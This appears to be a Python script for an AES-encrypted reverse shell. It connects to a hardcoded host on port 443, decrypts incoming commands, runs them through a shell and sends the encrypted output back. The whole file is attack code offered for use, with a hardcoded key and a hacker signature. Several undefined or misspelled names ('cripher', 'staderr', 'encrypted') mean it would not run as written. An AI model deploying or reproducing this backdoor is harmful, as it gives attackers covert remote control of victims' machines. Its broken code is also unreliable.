#!/usr/bin/env python

from Crypto.Cipher import AES
import subprocess,socket
import base64
import os


# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 16

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate a random secret key
secret = "aurelio26djfTFD4579BVcsaqjkloPm"

# create a cipher object using the random secret
cipher = AES.new(secret)

# encode a string
# encoded = EncodeAES(cipher, 'password')
# print 'Encrypted string:', encoded

# decode the encoded string
# decoded = DecodeAES(cipher, encoded)
# print 'Decrypted string:', decoded

host='192.168.1.6'
port=443

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))
# s.send('\n saludos te envia aureliohacking....')

suceso= EncodeAES( cripher, 'codificando transferencia! ')
s.send(suceso)
while 1:


    data=s.recv(1024)

 
    decrypted=DecodeAES(cripher,data)

    if decrypted == "fuera": break

    proc = subprocess.Popen(decrypted , shell=True, stdout=subprocess.PIPE, staderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 
    stadoutput = proc.stdout.read() + proc.staderr.read()
 
 
    encrypt=EncodeAES( cipher, stadoutput)
    s.send(encrypted)
s.send('nos vemos')
s.close()
